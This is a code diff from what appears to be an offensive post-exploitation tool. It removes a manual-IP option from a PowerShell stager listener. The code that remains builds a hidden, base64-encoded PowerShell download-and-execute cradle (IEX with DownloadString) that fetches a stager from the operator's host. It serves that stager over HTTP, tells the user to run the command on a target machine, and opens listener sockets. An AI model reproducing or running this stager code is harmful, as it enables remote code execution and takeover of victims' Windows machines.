@@ -29,8 +29,8 @@ def printListener(printit=True):
     powershellFileName = 'p.ps1'
 
     while True:
-        bindOrReverse = prompt_toolkit.prompt('[?] (b)ind/(r)everse/(m)anual: ', patch_stdout=True, completer=WordCompleter(['b', 'r', 'm'])).lower()
-        if bindOrReverse == 'b' or bindOrReverse == 'r' or bindOrReverse == 'm':
+        bindOrReverse = prompt_toolkit.prompt('[?] (b)ind/(r)everse: ', patch_stdout=True, completer=WordCompleter(['b', 'r'])).lower()
+        if bindOrReverse == 'b' or bindOrReverse == 'r':
             break
     if bindOrReverse == 'r':
         powershellContent = open('lib/powershell/stager.ps1', 'r').read()
@@ -38,22 +38,15 @@ def printListener(printit=True):
     if bindOrReverse == 'b':
         powershellContent = open('lib/powershell/stager.ps1', 'r').read()
         windows_powershell_stager = powershellContent % ('True', '', '5556')
-    if bindOrReverse == 'm':
-        manualIP = raw_input('[?] IP address to host stager: ' + t.normal).lower()
-        powershellContent = open('lib/powershell/stager.ps1', 'r').read()
-        windows_powershell_stager = powershellContent % ('False', manualIP, '5555')
 
     with open((payloaddir()+ '/' + powershellFileName), 'w') as powershellStagerFile:
         powershellStagerFile.write(windows_powershell_stager)
         powershellStagerFile.close()
+
     randoStagerDLPort = FUNCTIONS().randomUnusedPort()
 
-    if bindOrReverse == 'm':
-        FUNCTIONS().DoServe(manualIP, powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
-        stagerexec = 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + manualIP + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
-    else:
-        FUNCTIONS().DoServe(returnIP(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
-        stagerexec = 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
+    FUNCTIONS().DoServe(returnIP(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
+    stagerexec = 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
 
     if printit:
         print t.bold_green + '[!] Run this on target machine...' + t.normal + '\n\n' + stagerexec + '\n'
@@ -68,12 +61,6 @@ def printListener(printit=True):
         if not '5555' in str(serverlist):
             listenerserver = Server('0.0.0.0', 5555, bindsocket=True)
             serverlist.append(listenerserver)
-
-    if bindOrReverse == 'm':
-        if not '5555' in str(serverlist):
-            listenerserver = Server(manualIP, 5555, bindsocket=True)
-            serverlist.append(listenerserver)
-
 
     return stagerexec
 
